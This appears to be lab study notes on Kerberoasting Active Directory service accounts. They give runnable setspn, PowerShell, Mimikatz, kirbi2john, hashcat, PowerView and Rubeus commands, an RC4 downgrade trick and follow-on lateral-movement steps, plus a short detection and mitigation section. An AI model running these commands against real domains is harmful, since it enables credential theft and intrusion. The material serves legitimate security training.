## 1. What is Kerberoasting (in this context)?

Goal:
**From a Windows machine in a domain, request service tickets (TGS) for service accounts with SPNs, dump them, and crack their passwords offline.**

Why it works:

* Any *authenticated* domain user can request service tickets for any SPN.
* The **TGS is encrypted with the service account’s password-derived key.**
* If the password is weak → hashcat + `rockyou` = game over.

---

## 2. Manual Kerberoasting from Windows – Big Picture

You’re basically doing:

1. **Find SPNs tied to user accounts** (service accounts).
2. **Request TGS tickets** for those SPNs (so they load into memory).
3. **Dump tickets from memory** (Mimikatz → `.kirbi` or Base64).
4. **Convert TGS to a crackable hash** (`kirbi2john.py` → Hashcat format).
5. **Crack with Hashcat** and get the cleartext password.

---

## 3. Step-by-Step: Manual / Semi-Manual Route

### 3.1 Enumerate SPNs with `setspn.exe`

```cmd
setspn.exe -Q */*
```

* This lists **all SPNs** in the domain.
* You care about **user/service accounts**, not computer accounts.

  * e.g. `sqldev`, `sqlprod`, `backupagent`, etc.

---

### 3.2 Request a TGS for a *single* SPN (PowerShell)

Load the .NET Kerberos class and request a ticket:

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
    -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

What this does:

* Uses .NET’s `KerberosRequestorSecurityToken` to:

  * Ask the DC for a TGS **for that SPN**.
  * The ticket is now stored in your current logon session’s memory.

You can also combine with `setspn` to hit **all** SPNs:

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* |
  Select-String '^CN' -Context 0,1 |
  % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
        -ArgumentList $_.Context.PostContext[0].Trim() }
```

* This loop basically:

  * Enumerates SPNs,
  * Parses them,
  * Requests TGS tickets for each one.

---

### 3.3 Dump Tickets from Memory with Mimikatz

Enable base64 output (optional but nice if exfil is annoying):

```text
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

* `kerberos::list /export`:

  * Lists tickets in memory.
  * Exports to `.kirbi` files **and/or** Base64 (if `base64 /out:true` is set).
* You’ll see entries like:

  * Server: `MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433`
  * Client: `htb-student@INLANEFREIGHT.LOCAL`
  * Enctype: `rc4_hmac_nt` (aka etype 23)

You get a Base64 blob corresponding to a `.kirbi` file.

---

### 3.4 Turn Base64 Back into `.kirbi` on your attack box

Clean it up into a single line:

```bash
echo "<base64 blob>" | tr -d \\n
```

Then decode to `.kirbi`:

```bash
cat encoded_file | base64 -d > sqldev.kirbi
```

Now you have `sqldev.kirbi`.

---

### 3.5 Convert `.kirbi` → crackable hash (kirbi2john)

```bash
python2.7 kirbi2john.py sqldev.kirbi
```

* This outputs a file called `crack_file` containing a `$krb5tgs$...` hash.

For Hashcat, fix the format (sed trick):

```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

Now you have `sqldev_tgs_hashcat` ready for Hashcat.

---

### 3.6 Crack with Hashcat

RC4 (etype 23 → Hashcat mode `13100`):

```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

* If password is weak (like `database!`), it cracks fast.

---

## 4. Automated Route – PowerView & Rubeus

### 4.1 PowerView: enumerate and export hashcat-ready tickets

Load:

```powershell
Import-Module .\PowerView.ps1
```

Find SPN users:

```powershell
Get-DomainUser * -spn | select samaccountname
```

Target single user and get Hashcat format directly:

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

Export everything to CSV:

```powershell
Get-DomainUser * -SPN |
  Get-DomainSPNTicket -Format Hashcat |
  Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

Now you can just copy/paste hashes into Hashcat.

---

### 4.2 Rubeus: one-liner Kerberoast on steroids

Common patterns:

* Basic kerberoast to console:

```powershell
Rubeus.exe kerberoast /simple /nowrap
```

* Send output to file:

```powershell
Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
```

* Target specific SPN or user:

```powershell
Rubeus.exe kerberoast /user:sqldev /nowrap
```

* Focus on *admin-like* accounts:

```powershell
Rubeus.exe kerberoast /ldapfilter:"admincount=1" /nowrap
```

* Show **stats only** (no ticket requests):

```powershell
Rubeus.exe kerberoast /stats
```

Useful flags:

* `/nowrap` → no line wrapping, easy copy for Hashcat.
* `/aes` → request AES tickets.
* `/usetgtdeleg` or `/tgtdeleg` → request only RC4 where possible.
* `/rc4opsec` → opsec-optimized RC4 targeting.

---

## 5. Encryption Types: RC4 vs AES (Why it Matters)

Key points:

* **RC4 (etype 23 → `$krb5tgs$23$`)**

  * Old, weak, fast to crack.
  * Hashcat mode: `13100`.
  * Example: cracked in **4 seconds** on CPU with `rockyou`.

* **AES-256 (etype 18 → `$krb5tgs$18$`)**

  * Much stronger.
  * Hashcat mode: `19700`.
  * Same password, same wordlist: ~**minutes** on CPU vs seconds for RC4.
  * On GPU rigs, still crackable if password is weak but takes longer.

### `msDS-SupportedEncryptionTypes` (what’s allowed for that account)

* `0` → default = RC4_HMAC_MD5 only.
* `24` → AES128 + AES256 only.

PowerView example:

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

---

### Downgrade trick with `/tgtdeleg` (pre-2019 DCs)

* On **Server 2016 or earlier**, if AES is enabled, Rubeus can sometimes:

  * Use `/tgtdeleg` to request **RC4** tickets anyway.
  * Because it advertises RC4-only in the request.
* On **Server 2019 DCs**, this downgrade *does not* work:

  * DC will still give you the strongest enctype (AES-256).

So:

* **Older DCs + AES enabled** ≠ safe if RC4 still allowed.
* You can **force RC4** and crack much faster.

---

## 6. Detection & Mitigation Cheat Sheet

### Mitigation

* Use **gMSA/MSA** for service accounts → long, random, auto-rotating passwords.
* If using normal service accounts:

  * Set **long, unique, non-wordlist passwords**.
* Reduce or eliminate RC4 where operationally possible:

  * Configure Kerberos encryption types via Group Policy.
  * But test carefully; disabling RC4 can break old stuff.

### Detection

* Enable auditing:

  * Group Policy → `Audit Kerberos Service Ticket Operations`.
  * Logs:

    * **4769**: “A Kerberos service ticket was requested”
    * **4770**: “A Kerberos service ticket was renewed”
* Look for:

  * A **burst of 4769 events** from a single user/host in a short period.
  * Tickets with encryption type **0x17** (23 decimal → RC4) when you’d expect AES.

Example:

* Many 4769 events from user `htb-student` targeting multiple SPN accounts ⇒ likely Kerberoasting.

---

## 7. After Cracking – What You Do With It

Once you have the service account password:

* Log in via **RDP / WinRM** if the account is local admin somewhere.
* Use **PsExec / SMB** for lateral movement.
* Access **MSSQL** as DBA and abuse that for privesc.
* Pivot deeper, dump more creds, and expand domain control.

---

